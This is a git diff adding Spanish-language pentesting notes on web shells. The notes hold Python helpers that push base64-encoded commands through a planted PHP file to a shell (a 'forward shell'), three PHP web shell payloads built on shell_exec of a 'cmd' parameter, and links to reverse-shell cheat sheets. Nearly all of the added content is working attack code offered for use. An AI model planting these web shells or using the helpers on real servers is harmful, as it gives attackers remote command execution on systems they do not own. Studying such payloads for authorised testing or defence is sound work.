@@ -153,6 +153,56 @@ while True:
 	time.sleep(1.1)
 ```
 
+> Este script hay que adaptarlo según nuestras necesidades, si conseguimos introducir un archivo .php malicioso hay que especificar el mismo nombre en los siguientes apartados
+
+def RunCmd(cmd):
+	cmd = cmd.encode('utf-8')
+	cmd = b64encode(cmd).decode('utf-8')
+	payload = {
+        	'cmd' : 'echo "%s" | base64 -d | sh' %(cmd)
+		}
+	result = (requests.get('http://127.0.0.1/index.php', params=payload, timeout=5).text).strip()
+	return result
+
+def WriteCmd(cmd):
+	cmd = cmd.encode('utf-8')
+	cmd = b64encode(cmd).decode('utf-8')
+	payload = {
+		'cmd' : 'echo "%s" | base64 -d > %s' % (cmd, stdin)
+	}
+	result = (requests.get('http://127.0.0.1/index.php', params=payload, timeout=5).text).strip()
+	return result
+
+> Y teniendo en cuenta que el payload también tiene como nombre cmd.
+
+Ejemplo, creamos un archivo que se llame index.php e introducimos el siguiente payload:
+```bash
+<?php
+	echo shell_exec($_REQUEST['cmd']);
+?>
+```
+
+> Este payload nos permitirá una ejecución remota de comandos en la propia página web desde la propia url.
+
+$\_REQUEST : se utiliza la variable superglobal $\_REQUEST, que combina los valores de $\_GET, $\_POST y $\_COOKIE. Esto significa que el valor de 'cmd' se puede obtener tanto de una solicitud GET como POST o incluso de una cookie. 
+
+También se puede hacer para que solo acepte peticiones por GET de la siguiente manera:
+ ```bash
+ <?php
+	 echo shell_exec($_GET['cmd']);
+ ?>
+```
+
+### Etiquetas preformateadas
+Las etiquetas pre-formateadas nos darán una respuesta mucho más clara a la hora de dumpear información, porque muestra el output respetando los saltos de línea, en cambio sin las etiquetas mostrará el resultado todo en una línea.
+En ejemplo anterior no puse las etiquetas preformateadas porque no sería compatible con el script anterior para la Fordward Shell. 
+Payload
+```php
+<?php
+	echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
+?>
+```
+
 ### WEB PAGES
 - [Pentest monkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
 - [Hacktricks](https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/linux)
